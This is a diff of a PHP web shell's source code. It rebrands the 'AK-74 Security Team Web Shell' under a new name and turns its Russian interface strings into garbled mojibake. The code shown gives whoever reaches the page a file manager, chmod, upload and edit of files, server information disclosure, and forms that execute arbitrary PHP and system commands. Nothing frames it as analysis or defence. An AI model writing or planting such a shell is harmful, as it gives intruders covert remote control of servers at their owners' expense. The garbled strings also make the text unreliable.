@@ -65,21 +65,21 @@ class shell
   {
    chmod($_GET['file'],0777);
    if (unlink($_GET['file']))
-    return 'Файл удален!';
+    return 'Г”Г Г©Г« ГіГ¤Г Г«ГҐГ­!';
    else
-    return 'Файл удален!';
+    return 'Г”Г Г©Г« ГіГ¤Г Г«ГҐГ­!';
   }
   else
-   return 'Файл не найден!';
+   return 'Г”Г Г©Г« Г­ГҐ Г­Г Г©Г¤ГҐГ­!';
  }
 
   function removedir()
  {
    chmod($_GET['dir'],0777);
    if (rmdir($_GET['dir']))
-    return 'Директория удалена!';
+    return 'Г„ГЁГ°ГҐГЄГІГ®Г°ГЁГї ГіГ¤Г Г«ГҐГ­Г !';
    else
-    return 'Директория не найденa!';
+    return 'Г„ГЁГ°ГҐГЄГІГ®Г°ГЁГї Г­ГҐ Г­Г Г©Г¤ГҐГ­a!';
  }
  
 function getmicrotime()
@@ -165,7 +165,7 @@ return $res;
 function outputhead()
 {
 $res = '';
-$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"></head>
+$res .= '<html><head><title>TRAN PHUC ANH IT Web Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"></head>
 <body>
 <STYLE>
 A:link {
@@ -190,7 +190,7 @@ BODY {
 <div align="center"><table border=1 bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #C10000 2px solid">
  <tr>
   <td colspan=7 align="center">
-   <b><font color=#830000 size=4>.:: :[ AK-74 Security Team Web-shell ]: ::.</font></b>
+   <b><font color=#830000 size=4>.:: :[ TRAN PHUC ANH IT Web-shell ]: ::.</font></b>
   </td>
  </tr>';
 return $res;
@@ -204,19 +204,19 @@ function outputmenu()
    <table border=0 cellspacing=0 cellpadding=0>
     <tr align="center">
 	 <td width=150>
-	  <a href="'.$xshell.'?act=info">Общая информация</a>
+	  <a href="'.$xshell.'?act=info">ГЋГЎГ№Г Гї ГЁГ­ГґГ®Г°Г¬Г Г¶ГЁГї</a>
 	 </td>
 	 <td width=150>
-	  <a href="'.$xshell.'?act=filemanager">Файловый менеджер</a>
+	  <a href="'.$xshell.'?act=filemanager">Г”Г Г©Г«Г®ГўГ»Г© Г¬ГҐГ­ГҐГ¤Г¦ГҐГ°</a>
 	 </td>
 	 <td width=80>
 	  <a href="'.$xshell.'?act=phpinfo" target="_blank">phpinfo()</a>
 	 </td>
 	 <td width=110>
-	  <a href="'.$xshell.'?act=execute">Выполнить PHP</a>
+	  <a href="'.$xshell.'?act=execute">Г‚Г»ГЇГ®Г«Г­ГЁГІГј PHP</a>
 	 </td>
 	 <td width=150>
-	  <a href="'.$xshell.'?act=exesys">Выполнить команду</a>
+	  <a href="'.$xshell.'?act=exesys">Г‚Г»ГЇГ®Г«Г­ГЁГІГј ГЄГ®Г¬Г Г­Г¤Гі</a>
 	 </td>
       </tr>
    </table>
@@ -244,7 +244,7 @@ sort($files);
 $res .= '
  <tr>
   <td colspan=7 align="center">
-  <font color=#830000> Текущая директория:</font><b><font color=#830000>'.$_SESSION['currentdir'].'</font></b>
+  <font color=#830000> Г’ГҐГЄГіГ№Г Гї Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГї:</font><b><font color=#830000>'.$_SESSION['currentdir'].'</font></b>
   </td>
  </tr>
  <tr align="center">
@@ -254,14 +254,14 @@ $res .= '
   <td width=330>
    &nbsp;
   </td>
-  <td width=80><font color=#830000>Размер,</font> <b><font color=#830000>байт</font></b>
+  <td width=80><font color=#830000>ГђГ Г§Г¬ГҐГ°,</font> <b><font color=#830000>ГЎГ Г©ГІ</font></b>
    &nbsp;
   </td>
   <td width=120><font color=#830000>
-   Последнее изменение
+   ГЏГ®Г±Г«ГҐГ¤Г­ГҐГҐ ГЁГ§Г¬ГҐГ­ГҐГ­ГЁГҐ
    </font>
   </td>
-  <td width=80 align="center"><font color=#830000>Права доступа</font>
+  <td width=80 align="center"><font color=#830000>ГЏГ°Г ГўГ  Г¤Г®Г±ГІГіГЇГ </font>
    &nbsp;
   </td>
   <td width=30>
@@ -291,9 +291,9 @@ for ($i = 0; $i < count($files); $i++)
 $res .= '</table><br>';
 
 $res .= '<table border=0 bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #C10000 2px solid">';
-$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="mkdir"><b><font color=#830000>Создать директорию:</b></font> </td><td><input type="text" name="dircreate"><input type="submit" value="Создать"></form></td></tr>';
-$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="createfile"><b><font color=#830000>Создать файл:</b></font></td><td> <input type="text" name="filecreate"><input type="submit" value="Создать"></form></td></tr>';
-$res .= '<tr><td align=center><form enctype="multipart/form-data" action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="uploadfile"><b><font color=#830000>Закачать файл:</font></b></td><td><input type="file" name="filename" size="23"> <b><font color=#830000>и присвоить имя</b></font></td><td> <input type="text" name="filename2"><input type="submit" value="Вперёд"></form></td></tr>';
+$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="mkdir"><b><font color=#830000>Г‘Г®Г§Г¤Г ГІГј Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГѕ:</b></font> </td><td><input type="text" name="dircreate"><input type="submit" value="Г‘Г®Г§Г¤Г ГІГј"></form></td></tr>';
+$res .= '<tr><td align=center><form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="createfile"><b><font color=#830000>Г‘Г®Г§Г¤Г ГІГј ГґГ Г©Г«:</b></font></td><td> <input type="text" name="filecreate"><input type="submit" value="Г‘Г®Г§Г¤Г ГІГј"></form></td></tr>';
+$res .= '<tr><td align=center><form enctype="multipart/form-data" action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="uploadfile"><b><font color=#830000>Г‡Г ГЄГ Г·Г ГІГј ГґГ Г©Г«:</font></b></td><td><input type="file" name="filename" size="23"> <b><font color=#830000>ГЁ ГЇГ°ГЁГ±ГўГ®ГЁГІГј ГЁГ¬Гї</b></font></td><td> <input type="text" name="filename2"><input type="submit" value="Г‚ГЇГҐГ°ВёГ¤"></form></td></tr>';
 $res .= '<table border=0 width="700" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #C10000 1px solid">';
 $res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href="http://ak74-team.net" target="_blank">AK-74 Security Team<a> <font color=#83000>2005 - '.date("Y").'</font></b></td></tr>';
 return $res;
@@ -304,14 +304,14 @@ function outputinfo()
  $res = '';
  $res .= '<tr>
   <td align="center" colspan=7>
-   <b><font color=#83000>Общая информация о сервере</font></b>
+   <b><font color=#83000>ГЋГЎГ№Г Гї ГЁГ­ГґГ®Г°Г¬Г Г¶ГЁГї Г® Г±ГҐГ°ГўГҐГ°ГҐ</font></b>
   </td>
  </tr>
  <tr>
   <td colspan=7 align="left"><br>
    <ol>
     <b><font color=#830000>1. OS - </font></b><font color=#830000>'.(php_uname()).'</font><br><br>
-    <b><font color=#830000>2.  Версия PHP - </font></b><font color=#830000>'.(phpversion()).'</font><br><br>
+    <b><font color=#830000>2.  Г‚ГҐГ°Г±ГЁГї PHP - </font></b><font color=#830000>'.(phpversion()).'</font><br><br>
     <b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - '.( get_current_user()).' <b><font color=#830000>|| User ID</font></b> - '.( getmyuid()).' <b><font color=#830000>|| Group ID</b></font> - '.( getmygid ()).'</font><br><br>
     <b><font color=#830000>4. Server Software - </font></b><font color=#830000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>
     <b><font color=#830000>5. Request Method - </font></b><font color=#830000>'.(getenv('REQUEST_METHOD')).'</font><br><br>
@@ -334,7 +334,7 @@ $res .= '<form action="'.$xshell.'?act=filemanager" method="post"><input type="h
        .'<input type="hidden" name="file" value="'.$file.'">
  <tr>
   <td align="center" colspan=7>
-   <b><font color=#83000>Изменение прав доступа</font></b>
+   <b><font color=#83000>Г€Г§Г¬ГҐГ­ГҐГ­ГЁГҐ ГЇГ°Г Гў Г¤Г®Г±ГІГіГЇГ </font></b>
   </td>
  </tr>
  <tr>
@@ -344,7 +344,7 @@ $res .= '<tr align="center"><td>&nbsp;</td><td>r</td><td>w</td><td>x</td><td>r</
 $res .= '<tr><td><input type="hidden" name="perms0" value="'.$perms[0].'">'.$perms[0].'</td>';
 for ($i = 1; $i <= 9; $i++)
  $res .= '<td><input type="checkbox" name="perms'.$i.'"'.(($perms[$i] != '-') ? ' checked' : '' ).'></td>';
-$res .= '</tr><tr><td colspan=10 align="right"><input type="submit" value="Сохранить"></td></tr>';
+$res .= '</tr><tr><td colspan=10 align="right"><input type="submit" value="Г‘Г®ГµГ°Г Г­ГЁГІГј"></td></tr>';
 $res .= '</table></td></tr></form>';
 return $res;
 }
@@ -353,19 +353,19 @@ function editfileform($file)
 {
 $fp = fopen($file,'r');
 if (!$fp)
- return 'Редактирование файла';
+ return 'ГђГҐГ¤Г ГЄГІГЁГ°Г®ГўГ Г­ГЁГҐ ГґГ Г©Г«Г ';
 $res = '';
 $res .= '<form action="'.$xshell.'?act=filemanager" method="post"><input type="hidden" name="action" value="editfile">'
        .'<input type="hidden" name="file" value="'.$file.'"><tr>
   <td align="center" colspan=7>
-   <b><font color=#83000>Редактирование файла</font></b>
+   <b><font color=#83000>ГђГҐГ¤Г ГЄГІГЁГ°Г®ГўГ Г­ГЁГҐ ГґГ Г©Г«Г </font></b>
   </td>
  </tr>
  <tr>
   <td colspan=7 align="center">
    <table border=1 cellspacing=0 cellpadding=0>';
  $res .= '<tr><td><textarea rows=25 cols=100 name="filecontent">'.(htmlspecialchars(fread($fp, filesize($file)))).'</textarea></td></tr>';
- $res .= '<tr><td align="right"><b><font color=#830000>Rename:</font></b> <INPUT TYPE=TEXT NAME=rename size=100 maxlength=9999999 value='.$file.'> - <input type="submit" value="Редактировать"></td></tr>';
+ $res .= '<tr><td align="right"><b><font color=#830000>Rename:</font></b> <INPUT TYPE=TEXT NAME=rename size=100 maxlength=9999999 value='.$file.'> - <input type="submit" value="ГђГҐГ¤Г ГЄГІГЁГ°Г®ГўГ ГІГј"></td></tr>';
  $res .= '</table></td></tr></form>';
  fclose($fp);
  return $res;
@@ -377,13 +377,13 @@ function executeform()
  $res .= '<form action="'.$xshell.'?act=execute" method="post"><input type="hidden" name="action" value="execute">
  <tr>
   <td align="center" colspan=7>
-   <b><font color=#83000>Выполнение PHP-кода<br> Открытие и закрытие PHP кода ( &lt;? и ?> ) писать не нужно!</font></b>
+   <b><font color=#83000>Г‚Г»ГЇГ®Г«Г­ГҐГ­ГЁГҐ PHP-ГЄГ®Г¤Г <br> ГЋГІГЄГ°Г»ГІГЁГҐ ГЁ Г§Г ГЄГ°Г»ГІГЁГҐ PHP ГЄГ®Г¤Г  ( &lt;? ГЁ ?> ) ГЇГЁГ±Г ГІГј Г­ГҐ Г­ГіГ¦Г­Г®!</font></b>
   </td>
  </tr>
  <tr>
   <td colspan=7 align="center">
    <table border=1 cellspacing=0 cellpadding=0><tr><td><textarea rows=20 cols=80 name="phpcode">';
- $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Выполнить"></td></tr></table></td></tr>
+ $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Г‚Г»ГЇГ®Г«Г­ГЁГІГј"></td></tr></table></td></tr>
  <table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #C10000 1px solid">
 <tr><td align=center><b><font color=#83000>Copyright </font><a href="http://ak74-team.net" target="_blank">AK-74 Security Team<a> <font color=#83000>2005 - '.date("Y").'</font></b></td></tr>';
  return $res;
@@ -410,7 +410,7 @@ function exesysform()
  <tr>
   <td colspan=7 align="center">
    <table border=1 cellspacing=0 cellpadding=0><tr><td><textarea rows=5 cols=80 name="cmmd">';
- $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Выполнить"></td></tr></table></td></tr>
+ $res .= '</textarea></td></tr><tr><td align="right"><input type="submit" value="Г‚Г»ГЇГ®Г«Г­ГЁГІГј"></td></tr></table></td></tr>
  <table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #C10000 1px solid">
 <tr><td align=center><b><font color=#83000>Copyright </font><a href="http://ak74-team.net" target="_blank">AK-74 Security Team<a> <font color=#83000>2005 - '.date("Y").'</font></b></td></tr>';
  return $res;
@@ -506,9 +506,9 @@ function createdir()
 {
  if (!empty($_POST['dircreate']))
   if (mkdir($_SESSION['currentdir'].'/'.$_POST['dircreate']))
-   return 'Директория создана!';
+   return 'Г„ГЁГ°ГҐГЄГІГ®Г°ГЁГї Г±Г®Г§Г¤Г Г­Г !';
    
- return 'Ошибка при создании директории';
+ return 'ГЋГёГЁГЎГЄГ  ГЇГ°ГЁ Г±Г®Г§Г¤Г Г­ГЁГЁ Г¤ГЁГ°ГҐГЄГІГ®Г°ГЁГЁ';
 }
 
 function createfile()
@@ -516,16 +516,16 @@ function createfile()
  if (!empty($_POST['filecreate']))
  {
   if (file_exists($_SESSION['currentdir'].'/'.$_POST['filecreate']))
-   return 'Файл уже существует';
+   return 'Г”Г Г©Г« ГіГ¦ГҐ Г±ГіГ№ГҐГ±ГІГўГіГҐГІ';
   $fp = fopen($_SESSION['currentdir'].'/'.$_POST['filecreate'],"w");
   if ($fp)
   {
    fclose($fp);
-   return 'Файл создан!';
+   return 'Г”Г Г©Г« Г±Г®Г§Г¤Г Г­!';
   }
  }
    
- return 'Ошибка при создании файла';
+ return 'ГЋГёГЁГЎГЄГ  ГЇГ°ГЁ Г±Г®Г§Г¤Г Г­ГЁГЁ ГґГ Г©Г«Г ';
 }
 
 function uploadfile()
@@ -537,8 +537,8 @@ function uploadfile()
   $_POST['filename2'] = $_FILES['filename']['name'];
  if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))
   if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))
-   return 'Закачка файла не выполнена...';
- return 'Закачка файла произведена успешно!';
+   return 'Г‡Г ГЄГ Г·ГЄГ  ГґГ Г©Г«Г  Г­ГҐ ГўГ»ГЇГ®Г«Г­ГҐГ­Г ...';
+ return 'Г‡Г ГЄГ Г·ГЄГ  ГґГ Г©Г«Г  ГЇГ°Г®ГЁГ§ГўГҐГ¤ГҐГ­Г  ГіГ±ГЇГҐГёГ­Г®!';
 }
 
 }
@@ -562,12 +562,12 @@ function uploadfile()
  {
   case 'chmod':
    if($shell->chmodfile($_POST['file']))
-    $content .= 'Смена прав произошла успешно';
+    $content .= 'Г‘Г¬ГҐГ­Г  ГЇГ°Г Гў ГЇГ°Г®ГЁГ§Г®ГёГ«Г  ГіГ±ГЇГҐГёГ­Г®';
   break;
   
   case 'editfile':
    if ($shell->editfile($_POST['file']))
-    $content .= 'Редактирование произошло успешно';
+    $content .= 'ГђГҐГ¤Г ГЄГІГЁГ°Г®ГўГ Г­ГЁГҐ ГЇГ°Г®ГЁГ§Г®ГёГ«Г® ГіГ±ГЇГҐГёГ­Г®';
   break;
   
   case 'execute':
@@ -636,5 +636,6 @@ function uploadfile()
  $content .= $shell->outputdown();
  
  echo $content;
- echo '<center>Время генерации: '.($shell->getmicrotime()-$timestart).'</center>';
+ echo '<center>Г‚Г°ГҐГ¬Гї ГЈГҐГ­ГҐГ°Г Г¶ГЁГЁ: '.($shell->getmicrotime()-$timestart).'</center>';
+
 ?>
